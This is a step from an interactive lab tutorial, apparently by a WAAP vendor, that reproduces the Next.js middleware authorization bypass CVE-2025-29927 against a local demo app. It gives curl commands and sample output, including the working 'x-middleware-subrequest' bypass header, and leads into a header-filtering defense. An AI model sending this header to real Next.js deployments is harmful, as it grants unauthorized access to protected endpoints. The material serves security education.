<!--
SPDX-FileCopyrightText: 2025 United Security Providers AG, Switzerland

SPDX-License-Identifier: GPL-3.0-only
-->

&#127919; In this step you will:

* Access the vulnerable Next.js demo application
* Bypass the Next.js authorization (CVE-2025-29927)

### Access the vulnerable Next.js demo application

> &#8987; Wait until the console on the right side shows `*** Scenario ready ***` before accessing the backend (otherwise you'll see a `HTTP 502 Bad Gateway` error)!

As outlined in [CVE-2025-29927 Next.js Authorization bypass analysis](https://jfrog.com/blog/cve-2025-29927-next-js-authorization-bypass/) by JFrog Security team in March 2025, ...

The vulnerable Next.js demo application has been setup and will be used to demonstrate the problematic behavior.

> &#128270; Initially the backend will be accessed unprotected (not using USP Core WAAP)

While you can [access the demo application]({{TRAFFIC_HOST1_8080}}/api/hello) using a browser, you'll see a `HTTP 401` response since no authorization was sent. Note that this small demo application for simplicity accepts any value used as `Authorzation` Header.

Go ahead and make a HTTP GET request (without an authorization header) replicating the browser behavior:

```shell
curl -v http://localhost:8080/api/hello
```{{exec}}

<details>
<summary>example command output</summary>

```shell
* Host localhost:8080 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:8080...
* Connected to localhost (::1) port 8080
> GET /api/hello HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/8.5.0
> Accept: */*
>
< HTTP/1.1 401 Unauthorized
< content-type: application/json
< Vary: Accept-Encoding
< Date: Wed, 06 Aug 2025 14:10:05 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< Transfer-Encoding: chunked
<
* Connection #0 to host localhost left intact
{"error":"Unauthorized"}
```

</details>
<br />

The application correctly responds with message "unauthorized" (combined with HTTP Status Code 401). Now presenting (a fake) authorization header the backend responds with data:

```shell
curl -v \
  -H "Authorization: my-jwt-token-here" \
   http://localhost:8080/api/hello
```{{exec}}

<details>
<summary>example command output</summary>

```shell
* Host localhost:8080 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:8080...
* Connected to localhost (::1) port 8080
> GET /api/hello HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/8.5.0
> Accept: */*
> Authorization: my-jwt-token-here
>
< HTTP/1.1 200 OK
< vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch
< content-type: application/json
< Date: Wed, 06 Aug 2025 14:10:44 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< Transfer-Encoding: chunked
<
* Connection #0 to host localhost left intact
{"message":"Hello, World"}
```

</details>
<br />

So far we've tested access to the backend (without USP Core WAAP protection) and verified the correct backend behavior with and without an authorization header.

### Bypass the Next.js authorization (CVE-2025-29927)

Because of CVE-2025-29927 present in multiple Next.js versions (greatly analyzed in [this blog post from JFrog](https://jfrog.com/blog/cve-2025-29927-next-js-authorization-bypass/)) not having an authorization token does not guarantee denied access to the sensitive backend!

As seen now by using Next.js version 14 (up to 14.2.24) where one can send a static HTTP header **completely bypassing the Next.js Middleware authorization**:

```shell
curl -v \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://localhost:8080/api/hello
```{{exec}}

<details>
<summary>example command output</summary>

```shell
* Host localhost:8080 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:8080...
* Connected to localhost (::1) port 8080
> GET /api/hello HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/8.5.0
> Accept: */*
> x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
>
< HTTP/1.1 200 OK
< vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch
< content-type: application/json
< Date: Wed, 06 Aug 2025 14:09:11 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< Transfer-Encoding: chunked
<
* Connection #0 to host localhost left intact
{"message":"Hello, World"}
```

</details>
<br />

Now let's see how you can use [header filtering](https://docs.united-security-providers.ch/usp-core-waap/crd-doc/#corewaapservicespecheaderfiltering) **provided by USP Core WAAP** in the next step!
